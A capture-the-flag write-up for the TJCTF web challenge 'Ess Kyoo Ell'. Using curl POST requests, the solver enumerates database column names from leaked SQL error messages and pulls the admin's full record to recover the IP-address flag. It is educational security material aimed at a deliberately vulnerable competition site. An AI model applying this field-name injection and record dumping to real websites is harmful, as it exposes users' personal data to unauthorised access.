# Ess Kyoo Ell
Web - 40 points

## Challenge 

Written by okulkarni

Find the IP address of the admin user! (flag is tjctf{[ip]})

[Ess Kyoo Ell](https://ess-kyoo-ell.tjctf.org/)

## Solution

Upon login, it will show this error

	This is what I got about you from the database: no such column: password

Because there is javascript validation, let's move to command-line

```bash
~ $ curl --silent --data "email=abc&password=def" https://ess-kyoo-ell.tjctf.org/ | grep class=\"profile-name-card\"

            <p id="profile-name" class="profile-name-card">This is what I got about you from the database: no such column: password</p>

~ $ curl --silent --data "email=abc" https://ess-kyoo-ell.tjctf.org/ | grep class=\"profile-name-card\"

            <p id="profile-name" class="profile-name-card">This is what I got about you from the database: &#39;NoneType&#39; object is not iterable</p>
```

As you can see, `password` is not a valid column. Trying some others, I found out that there is a `username` column.

```bash
~ $ curl --silent --data "email" https://ess-kyoo-ell.tjctf.org/ | grep class=\"profile-name-card\"
            <p id="profile-name" class="profile-name-card">This is what I got about you from the database: &#39;NoneType&#39; object is not iterable</p>

~ $ curl --silent --data "email2" https://ess-kyoo-ell.tjctf.org/ | grep class=\"profile-name-card\"
            <p id="profile-name" class="profile-name-card">This is what I got about you from the database: no such column: email2</p>

~ $ curl --silent --data "username" https://ess-kyoo-ell.tjctf.org/ | grep class=\"profile-name-card\"
            <p id="profile-name" class="profile-name-card">This is what I got about you from the database: &#39;NoneType&#39; object is not iterable</p>
```

Now, find admin as the username

```bash
~ $ curl --silent --data "username=admin" https://ess-kyoo-ell.tjctf.org/ | grep class=\"profile-name-card\"
            <p id="profile-name" class="profile-name-card">This is what I got about you from the database: {&#39;id&#39;: 706, &#39;username&#39;: &#39;admin&#39;, &#39;first_name&#39;: &#39;Administrative&#39;, &#39;last_name&#39;: &#39;User&#39;, &#39;email&#39;: &#39;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="412524276c2f2e356c3529726c20252c702f01352b2235276f2e3326">[email&#160;protected]</a>&#39;, &#39;gender&#39;: &#39;Female&#39;, &#39;ip_address&#39;: &#39;145.3.1.213&#39;}</p>
```

HTML decode

	This is what I got about you from the database: {'id': 706, 'username': 'admin', 'first_name': 'Administrative', 'last_name': 'User', 'email': '[email protected]', 'gender': 'Female', 'ip_address': '145.3.1.213'}

## Flag

	tjctf{145.3.1.213}